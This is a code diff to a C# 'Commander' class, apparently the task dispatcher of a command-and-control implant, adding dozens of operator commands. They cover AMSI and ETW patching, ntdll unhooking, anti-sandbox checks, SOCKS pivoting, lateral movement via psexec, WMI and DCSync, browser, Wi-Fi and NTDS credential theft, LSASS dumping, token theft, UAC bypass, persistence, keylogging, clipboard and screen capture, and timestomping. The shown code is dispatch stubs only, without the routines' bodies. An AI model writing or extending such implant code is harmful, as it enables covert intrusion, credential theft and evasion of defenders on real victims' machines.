@@ -999,6 +999,328 @@ class Commander
                     result = "acknowledged";
                     break;
 
+                case "AMSI_PATCH":
+                    result = Evasion.PatchAmsi(task.args ?? "");
+                    break;
+                case "ETW_PATCH":
+                case "ETW_BYPASS":
+                    result = Evasion.PatchEtw();
+                    break;
+                case "NTDLL_UNHOOK":
+                    result = Evasion.UnhookNtdll();
+                    break;
+                case "APPLY_EVASION":
+                    result = Evasion.ApplyEvasion();
+                    break;
+                case "SLEEP_MASK":
+                {
+                    bool on = string.IsNullOrEmpty(task.args) || task.args.Trim().ToLower() == "on";
+                    result = Evasion.SetSleepMask(on);
+                    break;
+                }
+                case "PE_WIPE":
+                    result = Evasion.WipePeHeader();
+                    break;
+                case "HWBP_CLEAR":
+                    result = Evasion.ClearHwbp();
+                    break;
+                case "PPID_SPOOF":
+                    result = Evasion.SpawnWithPpid(task.args ?? "");
+                    break;
+                case "HOOKCHECK":
+                case "HOOK_CHECK":
+                    result = Evasion.CheckHooks();
+                    break;
+                case "ANTI_SANDBOX":
+                    result = Evasion.AntiSandbox();
+                    break;
+                case "WORK_HOURS":
+                case "WORK_HOURS_SET":
+                    result = Evasion.SetWorkHours(task.args ?? "");
+                    break;
+                case "DNS_CANARY":
+                case "DNS_CANARY_SET":
+                    result = Evasion.SetDnsCanary(task.args ?? "");
+                    break;
+
+                // ── Network / pivot / SOCKS5 ───────────────────────────────
+                case "PORTSCAN":
+                    result = Network.PortScan(task.args);
+                    break;
+                case "SOCKS_START":
+                    result = Network.SocksStart(task.args);
+                    break;
+                case "SOCKS_STOP":
+                    result = Network.SocksStop();
+                    break;
+                case "PORTFWD_ADD":
+                    result = Network.PortFwdAdd(task.args);
+                    break;
+                case "PORTFWD_DEL":
+                    result = Network.PortFwdDel(task.args);
+                    break;
+                case "PORTFWD_LIST":
+                    result = Network.PortFwdList();
+                    break;
+                case "RSOCKS_CONNECT":
+                    result = Network.RSocksConnect(task.args);
+                    break;
+                case "PIVOT_HTTP":
+                    result = Network.PivotHttp(task.args);
+                    break;
+                case "PIVOT_TCP":
+                    result = Network.PivotTcp(task.args);
+                    break;
+                case "SYSCALL_INFO":
+                    result = Network.SyscallInfo();
+                    break;
+                case "SPAWN_SPOOFED":
+                    result = Network.SpawnSpoofed(task.args);
+                    break;
+
+                case "lateral-psexec":
+                    result = Lateral.PsExec(task.args);
+                    break;
+
+                case "lateral-smbexec":
+                    result = Lateral.SmbExec(task.args);
+                    break;
+
+                case "lateral-atexec":
+                    result = Lateral.AtExec(task.args);
+                    break;
+
+                case "lateral-wmi":
+                    result = Lateral.Wmi(task.args);
+                    break;
+
+                case "lateral-dcom":
+                    result = Lateral.Dcom(task.args);
+                    break;
+
+                case "lateral-winrm":
+                    result = Lateral.WinRM(task.args);
+                    break;
+
+                case "lateral-ssh":
+                    result = Lateral.Ssh(task.args);
+                    break;
+
+                case "lateral-runas":
+                    result = Lateral.RunAs(task.args);
+                    break;
+
+                case "adcs-request":
+                    result = Lateral.AdcsRequest(task.args);
+                    break;
+
+                case "dcsync":
+                    result = Lateral.DcSync(task.args);
+                    break;
+
+                case "cred-gpp":
+                    result = Lateral.CredGpp(task.args);
+                    break;
+
+                case "cred-wifi":
+                    result = Lateral.CredWifi(task.args);
+                    break;
+
+                case "cred-browser":
+                    result = Lateral.CredBrowser(task.args);
+                    break;
+
+                case "cred-ntds":
+                    result = Lateral.CredNtds(task.args);
+                    break;
+
+                // ── Post-exploitation ──────────────────────────────────────
+                case "TOKEN_STEAL":
+                case "token-steal":
+                    result = PostEx.TokenSteal(task.args);
+                    break;
+
+                case "TOKEN_STORE":
+                case "token-store":
+                    result = PostEx.TokenStore(task.args);
+                    break;
+
+                case "TOKEN_USE":
+                case "token-use":
+                    result = PostEx.TokenUse(task.args);
+                    break;
+
+                case "TOKEN_LIST":
+                case "token-list":
+                    result = PostEx.TokenList();
+                    break;
+
+                case "TOKEN_DROP":
+                case "token-drop":
+                    result = PostEx.TokenDrop(task.args);
+                    break;
+
+                case "GETSYSTEM":
+                case "getsystem":
+                    result = PostEx.GetSystem();
+                    break;
+
+                case "UAC_BYPASS":
+                case "uac-bypass":
+                    result = PostEx.UacBypass(task.args);
+                    break;
+
+                case "PERSIST_RUN":
+                case "persist-run":
+                    result = PostEx.PersistRun(task.args);
+                    break;
+
+                case "PERSIST_TASK":
+                case "persist-task":
+                    result = PostEx.PersistTask(task.args.Split(new[]{' '}, 2)[0], task.args.Split(new[]{' '}, 2).Length > 1 ? task.args.Split(new[]{' '}, 2)[1] : "");
+                    break;
+
+                case "PERSIST_STARTUP":
+                case "persist-startup":
+                    result = PostEx.PersistStartup(task.args);
+                    break;
+
+                case "REG_QUERY":
+                case "reg-query":
+                    result = PostEx.RegQuery(task.args);
+                    break;
+
+                case "REG_SET":
+                case "reg-set":
+                    result = PostEx.RegSet(task.args);
+                    break;
+
+                case "REG_DEL":
+                case "reg-del":
+                    result = PostEx.RegDel(task.args);
+                    break;
+
+                case "REG_ENUM":
+                case "reg-enum":
+                    result = PostEx.RegEnum(task.args);
+                    break;
+
+                case "ADS_WRITE":
+                case "ads-write":
+                    result = PostEx.AdsWrite(task.args);
+                    break;
+
+                case "ADS_READ":
+                case "ads-read":
+                    result = PostEx.AdsRead(task.args);
+                    break;
+
+                case "ADS_LIST":
+                case "ads-list":
+                    result = PostEx.AdsList(task.args);
+                    break;
+
+                case "ADS_DEL":
+                case "ads-del":
+                    result = PostEx.AdsDel(task.args);
+                    break;
+
+                case "TIMESTOMP":
+                case "timestomp":
+                    result = PostEx.Timestomp(task.args);
+                    break;
+
+                case "COM_HIJACK":
+                case "com-hijack":
+                    result = PostEx.ComHijack(task.args);
+                    break;
+
+                case "ISHELL_START":
+                case "ishell-start":
+                    result = PostEx.IshellStart();
+                    break;
+
+                case "ISHELL_INPUT":
+                case "ishell-input":
+                    result = PostEx.IshellInput(task.args);
+                    break;
+
+                case "ISHELL_STOP":
+                case "ishell-stop":
+                    result = PostEx.IshellStop();
+                    break;
+
+                case "LSASS_DUMP":
+                case "lsass-dump":
+                    result = PostEx.LsassDump();
+                    break;
+
+                case "LSASS_DUMP_NT":
+                case "lsass-dump-nt":
+                    result = PostEx.LsassDumpNT();
+                    break;
+
+                case "KEYLOG_START":
+                case "keylog-start":
+                    result = PostEx.KeylogStart();
+                    break;
+
+                case "KEYLOG_STOP":
+                case "keylog-stop":
+                    result = PostEx.KeylogStop();
+                    break;
+
+                case "KEYLOG_DUMP":
+                case "keylog-dump":
+                    result = PostEx.KeylogDump();
+                    break;
+
+                case "SCREENWATCH_START":
+                case "screenwatch-start":
+                    result = PostEx.ScreenwatchStart(task.args);
+                    break;
+
+                case "SCREENWATCH_STOP":
+                case "screenwatch-stop":
+                    result = PostEx.ScreenwatchStop();
+                    break;
+
+                case "CLIP_START":
+                case "clip-start":
+                    result = PostEx.ClipStart();
+                    break;
+
+                case "CLIP_STOP":
+                case "clip-stop":
+                    result = PostEx.ClipStop();
+                    break;
+
+                case "CLIP_DUMP":
+                case "clip-dump":
+                    result = PostEx.ClipDump();
+                    break;
+
+                case "KERB_LIST":
+                case "kerb-list":
+                case "klist":
+                    result = PostEx.KerbList();
+                    break;
+
+                case "KERB_PTT":
+                case "kerb-ptt":
+                    result = PostEx.KerbPTT(task.args);
+                    break;
+
+                case "KERB_PURGE":
+                case "kerb-purge":
+                    result = PostEx.KerbPurge();
+                    break;
+
+                case "PE_EXEC":
+                case "pe-exec":
+                    result = PostEx.PeExec(task.args);
+                    break;
+
                 default:
                     err = "unsupported task type: " + task.type;
                     break;
